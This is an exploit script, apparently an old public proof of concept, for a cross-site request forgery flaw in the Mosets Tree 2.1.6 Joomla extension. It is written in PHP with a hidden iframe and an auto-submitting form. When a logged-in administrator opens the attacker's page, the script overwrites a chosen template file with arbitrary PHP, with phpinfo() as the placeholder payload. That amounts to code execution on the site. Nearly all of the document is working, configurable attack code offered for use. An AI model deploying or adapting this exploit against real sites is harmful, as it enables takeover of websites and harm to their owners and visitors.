<?php
/**
  * Mosets Tree 2.1.6 (Joomla) Template Overwrite CSRF
  * 3 October 2010
  * jdc
  *
  * How it works - admin template form has no nonce
  * How to exploit - get a logged in admin to click the wrong link ;)
  * Patched in 2.1.7
  */
// change these
$target = 'http://localhost/joomla';
$exploit = '<?php echo phpinfo(); ?>';
/* page - any one of:
page_addCategory
page_addListing
page_advSearchRedirect
page_advSearchResults
page_advSearch
page_claim
page_confirmDelete
page_contactOwner
page_errorListing
page_error
page_gallery
page_image
page_index
page_listAlpha
page_listing
page_listListings
page_ownerListing
page_print
page_recommend
page_replyReview
page_reportReview
page_report
page_searchByResults
page_searchResults
page_subCatIndex
page_usersFavourites
page_usersReview
page_writeReview
sub_alphaIndex
sub_images
sub_listingDetails
sub_listings
sub_listingSummary
sub_map
sub_reviews
sub_subCats
*/
$page = 'page_print';
// don't change these
$path = '/administrator/index.php';
$data = array(
     'pagecontent' => $exploit,
     'template' => 'm2',
     'option' => 'com_mtree',
     'task' => 'save_templatepage',
     'page' => $page
);
?>
<html>
<body>
<?php if (@$_GET['iframe']) : ?>
<form id="csrf" action="<?php echo $target.$path; ?>" method="post">
<?php foreach ($data as $k => $v) : ?>
<input type="text" value="<?php echo htmlspecialchars($v); ?>" 
name="<?php echo $k; ?>" />
<?php endforeach; ?>
<script type="text/javascript">
document.forms[0].submit();
</script>
</form>
<?php else : ?>
<h1>Mosets Tree 2.1.6 Template Overwrite CSRF Exploit</h1>
<p>If you were logged in as admin, you just got owned!</p>
<div style="display:none">
<iframe width="1" height="1" src="<?php __FILE__; ?>?iframe=1"></iframe>
</div>
<?php endif; ?>
</body>
</html>